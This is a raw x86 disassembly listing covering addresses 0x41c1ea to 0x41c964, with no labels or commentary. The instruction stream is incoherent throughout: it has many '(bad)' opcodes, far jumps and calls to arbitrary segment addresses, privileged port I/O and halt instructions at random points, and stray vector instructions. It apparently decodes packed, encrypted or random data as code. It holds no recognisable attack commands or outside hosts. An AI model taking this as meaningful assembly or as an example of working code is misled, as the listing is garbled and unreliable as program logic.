  41c1ea:	int    0x47
  41c1ec:	aad    0x1f
  41c1ee:	push   esi
  41c1ef:	adc    al,0xe2
  41c1f1:	and    eax,0x658c3098
  41c1f6:	ret    0x5a21
  41c1f9:	cmp    ecx,edi
  41c1fb:	jmp    0xa038:0x6c12253a
  41c202:	pop    ebp
  41c203:	mov    eax,DWORD PTR [ebx+0x73a9aecc]
  41c209:	shl    BYTE PTR [ecx+eax*4+0x75e8f7dd],1
  41c210:	mov    ds:0x2bdffc68,eax
  41c215:	popf   
  41c216:	pusha  
  41c217:	inc    esi
  41c218:	push   esp
  41c219:	inc    eax
  41c21a:	or     al,0xee
  41c21c:	ds jae 0x41c277
  41c21f:	stos   BYTE PTR es:[edi],al
  41c220:	jbe    0x41c20c
  41c222:	fstp   QWORD PTR [edi+0xd4b36c6]
  41c228:	ins    BYTE PTR es:[edi],dx
  41c229:	jae    0x41c215
  41c22b:	add    DWORD PTR [ebx+0x2653ade4],esp
  41c231:	push   ecx
  41c232:	xor    DWORD PTR [esi+0x1d01e7b7],ebx
  41c238:	sub    DWORD PTR [edi],0x28
  41c23b:	jne    0x41c227
  41c23d:	pop    edi
  41c23e:	pop    ds
  41c23f:	ret    0xaf20
  41c242:	loop   0x41c2b3
  41c244:	inc    ecx
  41c245:	mov    ds:0xda39cf72,eax
  41c24a:	xor    DWORD PTR [ebx-0x21fb4877],edi
  41c250:	and    esp,DWORD PTR [eax-0x123ad84f]
  41c256:	inc    edi
  41c257:	dec    edi
  41c258:	adc    cl,bh
  41c25a:	xor    esi,DWORD PTR [ebp+0x21]
  41c25d:	adc    ebx,DWORD PTR [ebx-0x55]
  41c260:	ds clc 
  41c262:	jg     0x41c249
  41c264:	fmul   QWORD PTR [ecx+0x5e]
  41c267:	dec    edi
  41c268:	sub    al,0x85
  41c26a:	push   edx
  41c26b:	and    edi,DWORD PTR [edi-0xe]
  41c26e:	push   eax
  41c26f:	ficom  DWORD PTR [ebx+ecx*8+0x479c44db]
  41c276:	push   edx
  41c277:	inc    esp
  41c278:	fistp  QWORD PTR [ebp+ecx*4+0xf07ac0f]
  41c27f:	jb     0x41c27c
  41c281:	imul   DWORD PTR [esi+0x160c588]
  41c287:	cwde   
  41c288:	mov    ds:0x1a555e6e,eax
  41c28d:	inc    ecx
  41c28e:	out    dx,al
  41c28f:	in     eax,dx
  41c290:	mov    bl,0xe4
  41c292:	mov    edx,0x39e5b321
  41c297:	(bad)  
  41c298:	lods   al,BYTE PTR ds:[esi]
  41c299:	mov    ah,BYTE PTR [ebp-0x36]
  41c29c:	call   0xcf6c:0x5e64f83c
  41c2a3:	nop
  41c2a4:	cwde   
  41c2a5:	xchg   edx,eax
  41c2a6:	ds loop 0x41c2b7
  41c2a9:	pop    esp
  41c2aa:	js     0x41c253
  41c2ac:	pop    edi
  41c2ad:	mov    bl,BYTE PTR [edx-0x2ffe2ccb]
  41c2b3:	(bad)  
  41c2b4:	test   eax,0x480993d0
  41c2b9:	push   ecx
  41c2ba:	jmp    0x3a52:0xb55fffe3
  41c2c1:	jns    0x41c2d2
  41c2c3:	aaa    
  41c2c4:	popa   
  41c2c5:	and    al,0x5b
  41c2c7:	scas   al,BYTE PTR es:[edi]
  41c2c8:	mov    ch,0x2a
  41c2ca:	cld    
  41c2cb:	(bad)  
  41c2cc:	gs pop edi
  41c2ce:	rcr    ebp,0xed
  41c2d1:	inc    esp
  41c2d2:	mov    ch,0x3c
  41c2d4:	fmul   st(7),st
  41c2d6:	pusha  
  41c2d7:	xor    ecx,0x3a
  41c2da:	leave  
  41c2db:	fs jmp 0x7b6:0x947dbf13
  41c2e3:	mov    edx,0x2050e3a1
  41c2e8:	mov    edi,0x4fc86fc7
  41c2ed:	sbb    al,0xa
  41c2ef:	sub    dl,ch
  41c2f1:	mov    dl,0x6b
  41c2f3:	test   eax,0x20643137
  41c2f8:	jp     0x41c301
  41c2fa:	dec    ebp
  41c2fb:	call   0x2024:0x94ce0190
  41c302:	pop    esi
  41c303:	into   
  41c304:	xor    esp,DWORD PTR [ebx]
  41c306:	dec    esp
  41c307:	sbb    DWORD PTR [ebx],esi
  41c309:	sbb    eax,0x8728ecc9
  41c30e:	(bad)  
  41c312:	hlt    
  41c313:	test   al,0x28
  41c315:	jns    0x41c2c6
  41c317:	mov    ecx,DWORD PTR [esi+esi*2-0x1f]
  41c31b:	sub    esp,DWORD PTR [edx]
  41c31d:	jle    0x41c31e
  41c31f:	add    al,0x4
  41c321:	xor    DWORD PTR [eax+0x5c383555],edi
  41c327:	xchg   BYTE PTR [esi+0x42ee31d0],al
  41c32d:	clc    
  41c32e:	dec    edi
  41c32f:	adc    ah,BYTE PTR [edx]
  41c331:	(bad)  
  41c332:	cmp    eax,0xd09b4297
  41c337:	call   0x1fbf:0x1182840
  41c33e:	stc    
  41c33f:	mov    cl,0xe5
  41c341:	adc    al,0xd1
  41c343:	test   ch,cl
  41c345:	dec    ebp
  41c346:	out    0x29,al
  41c348:	or     BYTE PTR [ebx],dh
  41c34a:	and    BYTE PTR [edx],al
  41c34c:	shl    BYTE PTR [ecx+ebp*2],1
  41c34f:	ficom  WORD PTR [edi+ebp*1+0x10]
  41c353:	or     dh,BYTE PTR [esi-0x7a]
  41c356:	mov    ebp,0x769175cf
  41c35b:	or     DWORD PTR [edx-0x48526cb6],ebx
  41c361:	loope  0x41c2f8
  41c363:	nop
  41c364:	(bad)  
  41c365:	push   ss
  41c366:	rcl    BYTE PTR [eax+0x58c9647c],cl
  41c36c:	mov    WORD PTR [ebx-0x39],ds
  41c36f:	aaa    
  41c370:	cmc    
  41c371:	push   edi
  41c372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c373:	add    DWORD PTR [ecx-0x1d],esp
  41c376:	sar    BYTE PTR ds:0x7b978ad1,1
  41c37c:	or     al,0xc0
  41c37e:	push   ebx
  41c37f:	push   0xffffffa2
  41c381:	dec    edx
  41c382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c383:	into   
  41c384:	inc    edx
  41c385:	sbb    DWORD PTR [eax],ebx
  41c387:	mov    ecx,0xf630fe83
  41c38c:	mov    ecx,DWORD PTR [eax+0x59000987]
  41c392:	xchg   ebx,eax
  41c393:	cmp    DWORD PTR [edi+0x8a05b6e],0x5412ca17
  41c39d:	ror    BYTE PTR [esi-0x4a],0x56
  41c3a1:	mov    ebp,0x4c23ef28
  41c3a6:	mov    dh,BYTE PTR [ebx-0x14]
  41c3a9:	jecxz  0x41c39b
  41c3ab:	loop   0x41c427
  41c3ad:	dec    esi
  41c3ae:	mov    bl,0x10
  41c3b0:	lahf   
  41c3b1:	aad    0x4d
  41c3b3:	xor    BYTE PTR [eax*1-0x2f66b],bh
  41c3ba:	or     eax,0xb2945e99
  41c3bf:	ror    DWORD PTR [ebx-0x7],1
  41c3c2:	mov    bh,0x4c
  41c3c4:	inc    esp
  41c3c5:	daa    
  41c3c6:	xchg   ebp,eax
  41c3c7:	push   eax
  41c3c8:	and    esi,ebp
  41c3ca:	cld    
  41c3cb:	mov    bl,0x93
  41c3cd:	add    edi,ecx
  41c3cf:	jecxz  0x41c3ba
  41c3d1:	fcom   DWORD PTR [ecx-0x48]
  41c3d4:	adc    al,0x49
  41c3d6:	dec    edx
  41c3d7:	pop    ds
  41c3d8:	mov    ds:0x247a793,al
  41c3dd:	dec    ebx
  41c3de:	mov    eax,0x7723f7f7
  41c3e3:	jl     0x41c45f
  41c3e5:	xchg   esp,eax
  41c3e6:	xchg   ecx,eax
  41c3e7:	into   
  41c3e8:	ins    DWORD PTR es:[edi],dx
  41c3e9:	fwait
  41c3ea:	mov    bl,0x3f
  41c3ec:	add    dl,BYTE PTR [edx]
  41c3ee:	push   cs
  41c3ef:	mov    edi,0xa6c6ff87
  41c3f4:	pop    ecx
  41c3f5:	inc    esi
  41c3f6:	adc    dh,BYTE PTR [eax+0x69]
  41c3f9:	and    dl,BYTE PTR [ebp+0x36c0038a]
  41c3ff:	mov    eax,ds:0x4f5e5a43
  41c404:	retf   0x8ed2
  41c407:	pop    DWORD PTR [ebx+0x46]
  41c40a:	xchg   BYTE PTR [eax],dl
  41c40c:	push   esp
  41c40d:	or     eax,0x1ac59614
  41c412:	and    dl,BYTE PTR [ebp+0x12]
  41c415:	push   eax
  41c416:	jbe    0x41c448
  41c418:	push   esp
  41c419:	add    DWORD PTR [ebp+0x4d],esp
  41c41c:	pop    esi
  41c41d:	out    0xe0,eax
  41c41f:	push   eax
  41c420:	mov    es:0x9cdcdf36,al
  41c426:	xchg   esi,eax
  41c427:	mov    ds:0x903e784b,eax
  41c42c:	mov    ebx,0xbddc8274
  41c431:	loop   0x41c426
  41c433:	push   ecx
  41c434:	into   
  41c435:	shl    DWORD PTR [edx],cl
  41c437:	cmp    BYTE PTR [ecx+0x71],ch
  41c43a:	add    DWORD PTR [edi+ecx*1-0x80],edx
  41c43e:	iret   
  41c43f:	push   ebp
  41c440:	dec    esp
  41c441:	ins    DWORD PTR es:[edi],dx
  41c442:	mov    ah,BYTE PTR [ebp+0x5446d103]
  41c448:	ins    DWORD PTR es:[edi],dx
  41c449:	push   ss
  41c44a:	mov    ch,0xc5
  41c44c:	popf   
  41c44d:	(bad)  
  41c44f:	mov    esp,0x2aa6b3ed
  41c454:	pop    esi
  41c455:	jle    0x41c3f6
  41c457:	xor    bh,BYTE PTR [ebx-0x8a8a89d]
  41c45d:	cmp    eax,0x849acbda
  41c462:	(bad)  [edi-0x76d5b6bd]
  41c468:	mov    ch,0xcd
  41c46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c46b:	ret    0x41ce
  41c46e:	(bad)  
  41c46f:	sub    al,0x7a
  41c471:	mov    WORD PTR [eax-0x2b9e7278],es
  41c477:	das    
  41c478:	mov    edx,0xa6fabfa9
  41c47d:	dec    ecx
  41c47e:	lods   al,BYTE PTR ds:[esi]
  41c47f:	std    
  41c480:	sub    BYTE PTR [ecx-0x7d369ff8],dl
  41c486:	sub    eax,0xc161eb13
  41c48b:	jmp    0xf0656634
  41c490:	enter  0x10a2,0x84
  41c494:	outs   dx,BYTE PTR ds:[esi]
  41c495:	pop    edx
  41c496:	jae    0x41c4d6
  41c498:	aaa    
  41c499:	cmp    eax,0xfc5e01ca
  41c49e:	jge    0x41c50d
  41c4a0:	in     eax,0xfd
  41c4a2:	out    0xd5,eax
  41c4a4:	add    eax,0x44b87d16
  41c4a9:	clc    
  41c4aa:	ja     0x41c474
  41c4ac:	and    al,0xf9
  41c4ae:	xor    eax,0xcd6a8d7e
  41c4b3:	fwait
  41c4b4:	jp     0x41c503
  41c4b6:	call   0x858fbe93
  41c4bb:	cli    
  41c4bc:	xchg   ebp,eax
  41c4bd:	fisub  DWORD PTR [ecx-0x2fc1100e]
  41c4c3:	jno    0x41c477
  41c4c5:	clc    
  41c4c6:	and    BYTE PTR [esi+0x7f],dh
  41c4c9:	out    0x8e,al
  41c4cb:	in     eax,0x4e
  41c4cd:	dec    edx
  41c4ce:	retf   0x53a7
  41c4d1:	dec    ebp
  41c4d2:	pop    esp
  41c4d3:	mov    ah,0x6c
  41c4d5:	rcr    DWORD PTR ds:[eax+esi*8+0x73],1
  41c4da:	in     al,0x26
  41c4dc:	pop    edx
  41c4dd:	loopne 0x41c4ea
  41c4df:	and    DWORD PTR [edx],ebp
  41c4e1:	daa    
  41c4e2:	adc    BYTE PTR [edx],bh
  41c4e4:	mov    bl,0x6c
  41c4e6:	dec    eax
  41c4e7:	xchg   edi,eax
  41c4e8:	rol    ebx,0x9e
  41c4eb:	mov    BYTE PTR [edi-0x2ff76b29],bl
  41c4f1:	fs xor al,0xae
  41c4f4:	adc    BYTE PTR [edx+0x5722c84f],ch
  41c4fa:	(bad)  
  41c4fb:	jne    0x41c51b
  41c4fd:	shr    DWORD PTR [ecx+0x7e9a2896],cl
  41c503:	mov    edi,0x25bb932f
  41c508:	cmp    BYTE PTR [edx-0x163a9532],ah
  41c50e:	dec    eax
  41c50f:	ins    BYTE PTR es:[edi],dx
  41c510:	ds loope 0x41c579
  41c513:	bound  ebx,QWORD PTR [ebp-0x74]
  41c516:	inc    ecx
  41c517:	mov    bl,0xf6
  41c519:	dec    ebx
  41c51a:	xor    bh,BYTE PTR [ebx+ebp*4-0x1d864b77]
  41c521:	in     eax,0xfc
  41c523:	fisubr DWORD PTR [edi+ebx*2-0x63cc6077]
  41c52a:	lds    esi,FWORD PTR [ebp-0x3d]
  41c52d:	lock pop ebx
  41c52f:	mov    ah,0xc9
  41c531:	jns    0x41c554
  41c533:	in     al,0x70
  41c535:	stc    
  41c536:	pop    esp
  41c537:	imul   edi,DWORD PTR [ebx+0x25],0xfb357bea
  41c53e:	fdiv   DWORD PTR [edx+0x70]
  41c541:	adc    eax,0xfdc9212c
  41c546:	mov    BYTE PTR [esi+0xae3c315],cl
  41c54c:	mov    cl,0x6e
  41c54e:	rcr    BYTE PTR [ebp-0x4a5006bf],1
  41c554:	mov    al,0x77
  41c556:	icebp  
  41c557:	popa   
  41c558:	cmp    eax,0xe88d55e6
  41c55d:	dec    esi
  41c55e:	inc    ecx
  41c55f:	retw   
  41c561:	nop
  41c562:	loop   0x41c5ac
  41c564:	mov    eax,0xfefdc0e3
  41c569:	enter  0xa823,0x9f
  41c56d:	out    0x30,eax
  41c56f:	inc    ebx
  41c570:	mov    al,0x1c
  41c572:	dec    esp
  41c573:	mov    ds:0x4f4ab839,al
  41c578:	or     BYTE PTR [esi+esi*4+0x204c1c2f],dl
  41c57f:	jl     0x41c56c
  41c581:	sahf   
  41c582:	xor    esi,DWORD PTR [eax]
  41c584:	mov    ss,WORD PTR [edi-0x7e]
  41c587:	jo     0x41c513
  41c589:	arpl   WORD PTR [esi+0x9],bp
  41c58c:	cwde   
  41c58d:	adc    al,0x92
  41c58f:	sar    DWORD PTR [esi-0x502695de],0x61
  41c596:	mov    ah,0x9b
  41c598:	repnz add esi,DWORD PTR [esi+0x51]
  41c59c:	rcr    DWORD PTR [edx-0x5a],1
  41c59f:	frstor [edi+0x355fc03]
  41c5a5:	clc    
  41c5a6:	test   eax,0x4ca7f038
  41c5ab:	dec    edi
  41c5ac:	inc    edx
  41c5ad:	fisubr DWORD PTR [eax]
  41c5af:	jl     0x41c5ee
  41c5b1:	xchg   ebx,eax
  41c5b2:	xor    edx,eax
  41c5b4:	sbb    DWORD PTR [ebx+0x5a],0xddd90a08
  41c5bb:	push   ebp
  41c5bc:	pushf  
  41c5bd:	add    BYTE PTR [edi+0x821d33],cl
  41c5c3:	outs   dx,BYTE PTR ds:[esi]
  41c5c4:	ror    BYTE PTR [ebx-0x65a4be8c],cl
  41c5ca:	pop    ebx
  41c5cb:	mov    ecx,0x3ef935f1
  41c5d0:	shr    BYTE PTR [eax-0x7a],cl
  41c5d3:	adc    DWORD PTR [ebx+0x34],eax
  41c5d6:	xor    BYTE PTR [esi-0x76],al
  41c5d9:	xor    BYTE PTR [edx],dl
  41c5db:	xor    bl,BYTE PTR [ebx]
  41c5dd:	hlt    
  41c5de:	mov    eax,0xd9f94871
  41c5e3:	mov    ds:0xe56c5aa4,eax
  41c5e8:	cmp    BYTE PTR [ecx],ch
  41c5ea:	cmp    al,0x7f
  41c5ec:	sub    edi,ebp
  41c5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ef:	add    edi,0xffffffbf
  41c5f2:	test   BYTE PTR [ecx-0x18],0xc0
  41c5f6:	sti    
  41c5f7:	add    al,0xa2
  41c5f9:	call   0x9fcf7626
  41c5fe:	or     al,dl
  41c600:	adc    BYTE PTR [edx],dl
  41c602:	mov    ch,BYTE PTR [ebp-0x26]
  41c605:	mov    eax,ds:0xbb0d43c4
  41c60a:	loope  0x41c58c
  41c60c:	push   edi
  41c60d:	push   eax
  41c60e:	push   esi
  41c60f:	stos   DWORD PTR es:[edi],eax
  41c610:	xor    esp,eax
  41c612:	fistp  DWORD PTR [esi+edx*1-0x71]
  41c616:	test   ecx,ebp
  41c618:	sti    
  41c619:	leave  
  41c61a:	jns    0x41c693
  41c61c:	iret   
  41c61d:	dec    esi
  41c61e:	cli    
  41c61f:	jge    0x41c61c
  41c621:	xor    ch,cl
  41c623:	xrelease xchg DWORD PTR [esi+esi*1+0x7d],esp
  41c628:	or     cl,BYTE PTR [edi+esi*1+0x7b]
  41c62c:	out    dx,al
  41c62d:	mov    al,ds:0x7064877c
  41c632:	cwde   
  41c633:	addr16 in eax,dx
  41c635:	cmp    bh,BYTE PTR [edi+esi*8]
  41c638:	sub    BYTE PTR [ebp-0x232102d4],bl
  41c63e:	popa   
  41c63f:	out    0x26,al
  41c641:	inc    ecx
  41c642:	xor    dl,BYTE PTR [ecx]
  41c644:	out    0x59,eax
  41c646:	dec    ebx
  41c647:	jp     0x41c67c
  41c649:	aam    0x9
  41c64b:	mov    ds:0x422c6fa1,eax
  41c650:	aad    0x6b
  41c652:	push   eax
  41c653:	jecxz  0x41c659
  41c655:	mov    bh,0xaf
  41c657:	jmp    edx
  41c659:	or     al,0x67
  41c65b:	mov    ebx,edx
  41c65d:	add    al,0xf8
  41c65f:	rol    BYTE PTR [ebp+0x3d],cl
  41c662:	cmp    bh,BYTE PTR [ebp-0x43]
  41c665:	jge    0x41c67d
  41c667:	add    eax,0xea3afe2e
  41c66c:	and    al,0x81
  41c66e:	icebp  
  41c66f:	cli    
  41c670:	psrlq  mm0,QWORD PTR [eax+ebp*8+0x64]
  41c675:	mov    esi,0x7ab37144
  41c67a:	ss fcmovb st,st(5)
  41c67d:	enter  0x6005,0x4b
  41c681:	push   esp
  41c682:	inc    ecx
  41c683:	shr    DWORD PTR [ecx-0xb],0x29
  41c687:	call   DWORD PTR [esi-0x96ebbfc]
  41c68d:	nop
  41c68e:	into   
  41c68f:	pop    ss
  41c690:	and    al,0xf5
  41c692:	dec    esi
  41c693:	enter  0x87b2,0x3d
  41c697:	icebp  
  41c698:	sub    eax,0xe281b916
  41c69d:	add    ah,BYTE PTR [edi-0x70be8d52]
  41c6a3:	adc    dh,dl
  41c6a5:	push   edx
  41c6a6:	nop    ebx
  41c6a9:	pop    edx
  41c6aa:	push   ebx
  41c6ab:	pop    ecx
  41c6ac:	sub    al,0xd2
  41c6ae:	lods   eax,DWORD PTR ds:[esi]
  41c6af:	(bad)  
  41c6b0:	std    
  41c6b1:	pop    eax
  41c6b2:	icebp  
  41c6b3:	jnp    0x41c6f6
  41c6b5:	dec    ebx
  41c6b6:	cmp    esi,eax
  41c6b8:	test   eax,0x628715e1
  41c6bd:	leave  
  41c6be:	in     eax,0x23
  41c6c0:	xor    cl,0x89
  41c6c3:	cmp    BYTE PTR [ebx+edi*2],dh
  41c6c6:	popf   
  41c6c7:	mov    ebx,0x5bb6a848
  41c6cc:	xor    eax,0xb22dbef4
  41c6d1:	inc    eax
  41c6d2:	xor    eax,ebx
  41c6d4:	jp     0x41c691
  41c6d6:	pop    es
  41c6d7:	inc    edi
  41c6d8:	push   edx
  41c6d9:	dec    esi
  41c6da:	cld    
  41c6db:	in     eax,dx
  41c6dc:	ins    DWORD PTR es:[edi],dx
  41c6dd:	sub    DWORD PTR [edi-0x5b],0xffffffe6
  41c6e1:	les    esi,FWORD PTR ds:0x8fa7011
  41c6e7:	mov    ebp,0x1ea443f7
  41c6ec:	nop    eax
  41c6ef:	and    al,0x68
  41c6f1:	aad    0x93
  41c6f3:	dec    ecx
  41c6f4:	vpcmpgtb xmm6,xmm2,XMMWORD PTR [ecx]
  41c6f8:	xchg   esi,eax
  41c6f9:	push   ds
  41c6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fb:	out    0xd7,al
  41c6fd:	ja     0x41c715
  41c6ff:	or     al,0x25
  41c701:	out    dx,eax
  41c702:	hlt    
  41c703:	sbb    al,dl
  41c705:	dec    ebp
  41c706:	push   ds
  41c707:	popa   
  41c708:	mov    esp,0x7b01647c
  41c70d:	jmp    0x311c5ab0
  41c712:	fisub  WORD PTR ds:0x89ad59d9
  41c718:	lods   al,BYTE PTR ds:[esi]
  41c719:	stos   BYTE PTR es:[edi],al
  41c71a:	fs add eax,0xbfdf04fb
  41c720:	push   0xfffffffa
  41c722:	div    BYTE PTR [ecx+0x47bd4a38]
  41c728:	push   ds
  41c729:	add    bl,BYTE PTR [ebx+eiz*8+0xf138144]
  41c730:	shl    BYTE PTR [edx-0x24],1
  41c733:	pushfw 
  41c735:	pop    esp
  41c736:	test   al,0xa0
  41c738:	pop    ss
  41c739:	sub    al,0x57
  41c73b:	fidiv  WORD PTR [ecx+eax*4+0x52]
  41c73f:	push   0xffffff98
  41c741:	fist   DWORD PTR [esi+edx*1+0x53a7409a]
  41c748:	retf   0xd429
  41c74b:	pop    ebx
  41c74c:	jg     0x41c6fd
  41c74e:	cdq    
  41c74f:	xchg   edx,eax
  41c750:	bound  edx,QWORD PTR [ebp+0x75979204]
  41c756:	pop    ecx
  41c757:	fwait
  41c758:	mov    ch,0xc1
  41c75a:	lods   eax,DWORD PTR ds:[esi]
  41c75b:	pop    ds
  41c75c:	mov    esp,0xccfe7d9a
  41c761:	jp     0x41c789
  41c763:	sub    al,0x6e
  41c765:	xchg   edi,eax
  41c766:	inc    esp
  41c767:	mov    DWORD PTR [esi+0x46],0xb1aa5516
  41c76e:	sti    
  41c76f:	ret    
  41c770:	loop   0x41c717
  41c772:	daa    
  41c773:	vpshaq ymm4,xmm2,[edi]
  41c778:	stos   BYTE PTR es:[edi],al
  41c779:	aam    0xce
  41c77b:	inc    esp
  41c77c:	cmp    ch,bh
  41c77e:	out    dx,al
  41c77f:	fld    st(0)
  41c781:	pop    ebp
  41c782:	test   DWORD PTR [ebx],ebx
  41c784:	rcl    DWORD PTR [esp+esi*1+0x584ebc3f],cl
  41c78b:	push   edi
  41c78c:	in     eax,dx
  41c78d:	les    edx,FWORD PTR [esi+0x71a119e]
  41c793:	retf   
  41c794:	jecxz  0x41c75c
  41c796:	inc    edi
  41c797:	lahf   
  41c798:	out    dx,al
  41c799:	mov    cl,0xbe
  41c79b:	mov    al,0x11
  41c79d:	adc    DWORD PTR cs:[edx-0x439f367d],esp
  41c7a4:	inc    ebp
  41c7a5:	add    al,0xf3
  41c7a7:	stos   DWORD PTR es:[edi],eax
  41c7a8:	ret    
  41c7a9:	sar    DWORD PTR [esi],cl
  41c7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ac:	adc    edi,edx
  41c7ae:	add    al,BYTE PTR [esi-0x1d]
  41c7b1:	sbb    al,0x73
  41c7b3:	jbe    0xe2cf3753
  41c7b9:	or     al,0xfe
  41c7bb:	sbb    ah,BYTE PTR [edi+0xf]
  41c7be:	ins    DWORD PTR es:[edi],dx
  41c7bf:	push   edi
  41c7c0:	ss aam 0x35
  41c7c3:	lea    edx,[ebx-0x57]
  41c7c6:	hlt    
  41c7c7:	cmp    edx,DWORD PTR [ecx-0x2c]
  41c7ca:	retf   0x7c8f
  41c7cd:	xor    edx,DWORD PTR [edx-0x2391575e]
  41c7d3:	sub    BYTE PTR [edi],bh
  41c7d5:	daa    
  41c7d6:	bound  ecx,QWORD PTR [ebx+0x53]
  41c7d9:	pop    edx
  41c7da:	lds    edx,FWORD PTR [ebp+0x2f]
  41c7dd:	mov    BYTE PTR [esp+esi*1],dh
  41c7e0:	ins    BYTE PTR es:[edi],dx
  41c7e1:	lock pop ebx
  41c7e3:	out    0x58,eax
  41c7e5:	inc    esp
  41c7e6:	xchg   DWORD PTR [edx],esp
  41c7e8:	xchg   edx,eax
  41c7e9:	fisttp DWORD PTR [eax+0x6b7569]
  41c7ef:	scas   eax,DWORD PTR es:[edi]
  41c7f0:	pop    es
  41c7f1:	(bad)  
  41c7f2:	cdq    
  41c7f3:	mov    ebx,edi
  41c7f5:	pop    es
  41c7f6:	sahf   
  41c7f7:	bound  esi,QWORD PTR [ebx]
  41c7f9:	push   ss
  41c7fa:	dec    ebp
  41c7fb:	hlt    
  41c7fc:	xchg   esp,eax
  41c7fd:	push   edx
  41c7fe:	(bad)  
  41c800:	jns    0x41c7f8
  41c802:	xchg   DWORD PTR [edi],ebx
  41c804:	in     eax,dx
  41c805:	sbb    edi,esp
  41c807:	jo     0x41c7f6
  41c809:	sub    eax,0xbf9c30f3
  41c80e:	mov    edx,0x9c79906a
  41c813:	jecxz  0x41c857
  41c815:	dec    edi
  41c816:	or     eax,0x6f777fd
  41c81b:	(bad)  
  41c81c:	stos   BYTE PTR es:[edi],al
  41c81d:	jmp    0x43e5:0x17adf12d
  41c824:	sub    DWORD PTR [ebx+ebp*2],esp
  41c827:	pop    edi
  41c828:	mov    esp,edi
  41c82a:	lods   al,BYTE PTR ds:[esi]
  41c82b:	nop
  41c82c:	loop   0x41c847
  41c82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c82f:	fwait
  41c830:	push   ecx
  41c831:	les    ebx,FWORD PTR [edx+edi*1]
  41c834:	xchg   BYTE PTR ds:0x744bc7f4,al
  41c83a:	test   ch,cl
  41c83c:	or     DWORD PTR [ecx-0x2d34a4f0],0x1af8bc94
  41c846:	mov    es:0x22233b46,al
  41c84c:	mov    al,0x0
  41c84e:	les    eax,FWORD PTR [esi]
  41c850:	into   
  41c851:	(bad)  
  41c852:	push   ebp
  41c853:	cmp    eax,DWORD PTR [ecx-0x7142027]
  41c859:	xor    edx,esi
  41c85b:	imul   ebx,DWORD PTR [eax+ecx*8-0x63ccbfa5],0x67c6861d
  41c866:	push   ss
  41c867:	sar    BYTE PTR [esi],0xea
  41c86a:	mov    ebp,ecx
  41c86c:	gs iret 
  41c86e:	mov    ds:0x8a9556de,al
  41c873:	or     bl,BYTE PTR [edx-0x2f]
  41c876:	repz mov ecx,0xe0ae1e56
  41c87c:	fnstenv [edx-0x5b]
  41c87f:	adc    ecx,DWORD PTR [ecx+ebx*8+0x4a]
  41c883:	lock mov al,ds:0xce1769dc
  41c889:	or     eax,0x1101fb14
  41c88e:	mov    dh,0x16
  41c890:	xchg   ebp,eax
  41c891:	fimul  WORD PTR [ecx]
  41c893:	sbb    DWORD PTR [eax],esp
  41c895:	cdq    
  41c896:	add    ecx,DWORD PTR [eax-0x438404e6]
  41c89c:	push   esi
  41c89d:	jns    0x41c8d6
  41c89f:	daa    
  41c8a0:	stos   DWORD PTR es:[edi],eax
  41c8a1:	(bad)  
  41c8a2:	cmp    ebp,DWORD PTR ds:0x8c46d19e
  41c8a8:	jle    0x41c840
  41c8aa:	cmp    al,0xec
  41c8ac:	fs jmp 0x41c835
  41c8af:	dec    esp
  41c8b0:	out    dx,eax
  41c8b1:	retf   
  41c8b2:	jle    0x41c8f7
  41c8b4:	mov    esi,0xed796494
  41c8b9:	dec    eax
  41c8ba:	hlt    
  41c8bb:	dec    edi
  41c8bc:	shl    BYTE PTR [edx+0x3a],0x34
  41c8c0:	pop    es
  41c8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8c2:	and    al,BYTE PTR [eax-0x6]
  41c8c5:	(bad)  [esi]
  41c8c7:	ins    BYTE PTR es:[edi],dx
  41c8c8:	mov    ebp,0xd45f88c0
  41c8cd:	ss comiss xmm1,xmm1
  41c8d1:	das    
  41c8d2:	repnz and ebx,edi
  41c8d5:	push   ds
  41c8d6:	(bad)  
  41c8d7:	leave  
  41c8d8:	lea    edx,[ebx]
  41c8da:	add    ebp,DWORD PTR [ebx+0x50]
  41c8dd:	mov    dl,0xb4
  41c8df:	mov    al,ds:0xc2f1faed
  41c8e4:	dec    eax
  41c8e5:	jmp    0xb353:0x6c60e857
  41c8ec:	sbb    al,0x9f
  41c8ee:	push   esi
  41c8ef:	sahf   
  41c8f0:	ds nop
  41c8f2:	ror    DWORD PTR [eax],0x14
  41c8f5:	jecxz  0x41c8bb
  41c8f7:	push   ss
  41c8f8:	pop    es
  41c8f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8fa:	cli    
  41c8fb:	push   ecx
  41c8fc:	sub    ebx,edx
  41c8fe:	and    esp,edx
  41c900:	fcom   QWORD PTR [ebx]
  41c902:	jnp    0x41c92e
  41c904:	add    edx,ecx
  41c906:	(bad)  
  41c907:	rcr    BYTE PTR [edx],0x73
  41c90a:	xchg   ecx,eax
  41c90b:	xor    al,0x23
  41c90d:	dec    ebp
  41c90e:	or     eax,0x68eca8c2
  41c913:	push   cs
  41c914:	shl    DWORD PTR [ebx],1
  41c916:	cmp    eax,0x77a6a5da
  41c91b:	rcr    BYTE PTR [edi],0xdd
  41c91e:	push   ecx
  41c91f:	mov    es,WORD PTR [esi-0x59]
  41c922:	sahf   
  41c923:	lds    ecx,FWORD PTR [edi-0x7f]
  41c926:	scas   eax,DWORD PTR es:[edi]
  41c927:	lock test al,0x9d
  41c92a:	push   edx
  41c92b:	mov    cl,0x48
  41c92d:	mov    ?,WORD PTR [eax-0x11c6ba4c]
  41c933:	dec    edx
  41c934:	jg     0x41c918
  41c936:	push   cs
  41c937:	jnp    0x41c929
  41c939:	pop    esi
  41c93a:	xor    BYTE PTR ds:0x9a70c33a,al
  41c940:	and    DWORD PTR [ecx+0x2658e663],eax
  41c946:	add    ebp,eax
  41c948:	mov    DWORD PTR [esi-0x267cac6c],esi
  41c94e:	adc    eax,0x78175388
  41c953:	add    al,0x58
  41c955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c956:	xor    esp,edx
  41c958:	jo     0x41c948
  41c95a:	fist   WORD PTR [ebx]
  41c95c:	jp     0x41c974
  41c95e:	jno    0x41c980
  41c960:	add    ah,BYTE PTR [edi]
  41c962:	dec    esi
  41c963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c964:	push   0x51647815
